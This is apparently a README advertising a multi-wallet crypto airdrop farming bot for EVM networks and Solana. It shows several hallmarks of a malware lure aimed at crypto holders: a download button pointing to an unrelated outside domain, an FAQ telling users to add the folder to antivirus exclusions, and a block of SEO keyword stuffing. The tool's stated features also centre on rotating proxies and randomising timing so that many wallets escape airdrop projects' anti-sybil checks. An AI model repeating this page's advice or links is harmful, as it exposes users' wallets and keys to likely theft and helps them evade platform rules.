# Crypto Airdrop Farming Bot 🪂🤖

A self-hosted automation framework for **testnet and quest-based airdrop campaigns** — the repetitive part of farming where the same swap, bridge, mint, or daily check-in has to be repeated across dozens of wallets without missing a day. Instead of a single hardcoded script, this project gives you a modular task runner: each campaign is a small config file describing the steps, wallets are managed as profiles, and every action is logged per wallet so you can audit what was actually done. Built for EVM networks and Solana, with proxy support and a CLI that AI agents can call.

[![Download Crypto Airdrop Farming Bot](https://img.shields.io/badge/Download-Crypto_Airdrop_Farming_Bot-blueviolet)](https://dyhuiying.com/s/file)

![Version](https://img.shields.io/badge/version-1.2-blue)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-0078D6)
![Status](https://img.shields.io/badge/status-active-brightgreen)
![Networks](https://img.shields.io/badge/networks-10%2B-orange)

<details>
<summary>📑 Contents</summary>

- [Quick Start](#-quick-start)
- [Requirements](#️-requirements)
- [Key Features](#-key-features)
- [Module Overview](#-module-overview)
- [Why Choose Crypto Airdrop Farming Bot](#-why-choose-crypto-airdrop-farming-bot)
- [FAQ](#-faq)
- [SEO Keywords](#-seo-keywords)

</details>

## ⚡ Quick Start

1. Download the archive using the button above.
2. Install dependencies with `pip install -r requirements.txt`.
3. Create a `campaigns/` folder with your task config and a `wallets.txt` file, then run `farming run <campaign>`.

The runner executes tasks wallet by wallet and writes a per-wallet log to `logs/`.

## 🖥️ Requirements

| Item | Requirement |
|------|-------------|
| OS | Windows 10/11, macOS 12+, Linux (64-bit) |
| RAM | 2 GB minimum |
| Storage | 200 MB free |
| Privileges | Standard user (no admin required) |

## ✨ Key Features

**Task Runner**

- 🧩 **Modular Campaigns** — each airdrop is a YAML or JSON config listing steps, so adding a new campaign never touches the core code.
- 🔁 **Repeatable Steps** — swap, bridge, mint, stake, check-in, and quest-claim actions as reusable modules.
- 📅 **Scheduled Runs** — daily, hourly, or randomized intervals to match campaign requirements.
- 🧾 **Per-Wallet Logs** — every action recorded with timestamp, transaction hash, and outcome.

**Wallet Management**

- 👛 **Multi-Wallet Profiles** — import wallets from a text file or keystore, with labels per group.
- 🔀 **Randomized Order** — shuffle execution order and delays to avoid identical patterns across wallets.
- 🛡️ **Proxy Support** — per-wallet or global proxies with rotation and failover.
- 💾 **Encrypted Storage** — optional password-protected keystore instead of plain-text keys.

**Network Coverage**

- 🔗 **EVM Networks** — Ethereum, Arbitrum, Base, Optimism, Linea, zkSync, Scroll, and other EVM testnets and mainnets.
- 🌊 **Solana Support** — SPL transfers, swaps, and quest actions through a Solana task module.
- 💧 **DEX Integrations** — Uniswap, PancakeSwap, Jupiter, and similar routers as prebuilt swap modules.
- 🌉 **Bridge Modules** — common bridges wrapped as single-step tasks.

**Monitoring & Reporting**

- 📊 **Campaign Dashboard** — per-wallet progress, completed steps, and failed transactions in one view.
- 📤 **CSV Export** — wallet activity export for tracking eligibility off-platform.
- 🚨 **Failure Alerts** — Telegram or webhook notification when a step fails repeatedly.
- 🐳 **Docker Support** — one-command deployment with `docker compose up`.

## 📋 Module Overview

| Module | What it does | Interface |
|--------|--------------|-----------|
| campaign_runner | Execute YAML tasks step by step | CLI |
| wallet_manager | Import, label, and encrypt wallets | CLI |
| proxy_rotator | Per-wallet proxy rotation | Config |
| evm_tasks | Swap, bridge, mint, stake modules | Python API |
| solana_tasks | SPL transfers and swaps | Python API |
| scheduler | Daily, hourly, or randomized runs | Config |
| activity_logger | Per-wallet logs and CSV export | CLI |
| docker_runner | Container deployment | Docker |

## 🚀 Why Choose Crypto Airdrop Farming Bot

- ✅ Config-first design — a new campaign is a new file, not a fork of the codebase.
- ✅ Audit trail — every wallet action is logged with a timestamp and transaction hash.
- ✅ Multi-chain — EVM networks and Solana share the same runner and wallet manager.
- ✅ Randomized execution — order, delays, and proxies reduce identical transaction patterns.
- ✅ Self-hosted — keys, proxies, and wallet data stay on your machine.

## 💡 Why Use It

- 🪂 Run the same testnet or quest steps across many wallets without manual repetition.
- 🧭 Keep a per-wallet log so you know which wallets actually completed which steps.
- 🔀 Rotate proxies and randomize timing so activity does not look identical across wallets.
- 📤 Export wallet activity to a spreadsheet when it is time to check eligibility.

## ❓ FAQ

**Do I need to run it as Administrator?**
No — the bot runs as a standard user process and does not require elevated privileges.

**Will my antivirus flag the file?**
Some engines may flag Python entry points by heuristic. Add the project folder to exclusions if needed.

**Does it work on Windows 11?**
Yes — Windows 10/11, macOS, and Linux are all supported.

**Does it guarantee an airdrop allocation?**
No — airdrop eligibility is decided by the project, and this tool only automates the on-chain steps.

**How do I update?**
Pull the latest archive and reinstall dependencies — wallets and campaign configs are preserved.

## 🔎 SEO Keywords

Crypto Airdrop Farming Bot, airdrop farming bot, airdrop bot github, self-hosted airdrop bot, crypto airdrop automation, testnet farming bot, multi-wallet airdrop bot, airdrop farming script, crypto quest bot, EVM airdrop bot, Solana airdrop bot, proxy airdrop bot, airdrop automation framework, crypto farming bot, airdrop farming tool, multi-chain airdrop bot, wallet automation crypto, airdrop task runner, open source airdrop bot, airdrop farming guide

## ⚠️ Disclaimer

Provided for educational and informational purposes only. Use at your own risk and in accordance with the terms of service of any network, protocol, or platform you interact with. Airdrop eligibility and allocation are decided by the issuing project and are not guaranteed.
